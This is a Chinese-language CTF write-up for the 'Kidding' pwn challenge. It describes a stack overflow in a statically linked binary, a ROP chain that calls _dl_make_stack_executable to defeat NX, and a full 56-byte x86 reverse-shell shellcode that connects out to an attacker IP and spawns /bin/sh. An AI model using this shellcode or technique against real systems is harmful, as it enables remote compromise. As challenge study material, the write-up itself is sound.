Pwn/Kidding
===========
> Solved by 梁智湧

## 程式描述
本題程式為statically linked，在本題中明顯提供解題者一個stack buffer overflow的漏洞，但因為程式有NX保護，必須使用ROP來控制程式行為。在寫入的第12byte後開始覆蓋`main`的return address，共計有**88 bytes的overflow空間**。在程式read完以後便切斷該程式對client的連線，即使拿到shell也無法操控該shell。

## Exploit
較簡單的解決辦法為建立一個reverse shell，但如果全部只使用ROP最多只能放入22個gadgets（包括argument與padding等等）。所幸程式中可以找到`_dl_make_stack_executable`這個function以幫助解除NX保護，接著便可以shellcode來產生一個reverse shell。

### 解除stack的NX保護
參考[此篇writeup](http://radare.today/posts/defeating-baby_rop-with-radare2/)，以下步驟可解除stack的NX保護：

1. 將`__stack_prot`設為`7`。
2. 將`__libc_stack_end`的address放入*eax*中。
3. 呼叫`_dl_make_stack_executable`。

解除NX後使用`call esp`的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。

### 放入reverse shell的shellcode
建立reverse shell須執行`socket`、`dup2`、`connect`、`execve`等指令，由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：

#### 想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，若能應用當時程式的某些state便可減少一點size。以下簡述減縮shellcode size的辦法：

1. 由於fd中0、1、2皆已被`close`，拿到的socket fd即已為0，因此只需進行一次`dup2`。
2. 由於*ebp*可控（*ebp*的值會等於input中的第8~11 byte），由此可以`push ebp`取代一次`push 0xXXXXXXXX`，省下4 bytes。
3. `push` port時使用*ax*中已有的數值（0x66），port（big endian）將被固定為0x6600（26112）。
4. 沒啥好說的了，就是**硬縮**。

此為最後所使用的shellcode（共56 bytes），其中IP位置須位於*ebp*當中、port固定為26112：
```asm
   0:   6a 01                   push   0x1
   2:   5b                      pop    ebx
   3:   99                      cdq
   4:   b0 66                   mov    al,0x66
   6:   52                      push   edx
   7:   53                      push   ebx
   8:   6a 02                   push   0x2
   a:   89 e1                   mov    ecx,esp
   c:   cd 80                   int    0x80
   e:   5e                      pop    esi
   f:   59                      pop    ecx
  10:   93                      xchg   ebx,eax
  11:   b0 3f                   mov    al,0x3f
  13:   cd 80                   int    0x80
  15:   b0 66                   mov    al,0x66
  17:   55                      push   ebp
  18:   66 50                   push   ax
  1a:   66 56                   push   si
  1c:   89 e1                   mov    ecx,esp
  1e:   0e                      push   cs
  1f:   51                      push   ecx
  20:   53                      push   ebx
  21:   89 e1                   mov    ecx,esp
  23:   b3 03                   mov    bl,0x3
  25:   cd 80                   int    0x80
  27:   b0 0b                   mov    al,0xb
  29:   59                      pop    ecx
  2a:   68 2f 73 68 00          push   0x68732f
  2f:   68 2f 62 69 6e          push   0x6e69622f
  34:   89 e3                   mov    ebx,esp
  36:   cd 80                   int    0x80
```

#### 部分shellcode之後再read
這是賽後聽其他組所使用的辦法。在僅有的56 bytes中不進行`dup2`，只做了`socket`與`connect`，並使用`read`讀進剩餘shellcode以完成`dup2`與`execve`。

## Solver
```bash
$ python solver.py
```

## Flag
`CTF{It_is_just_4_kiddin9}`
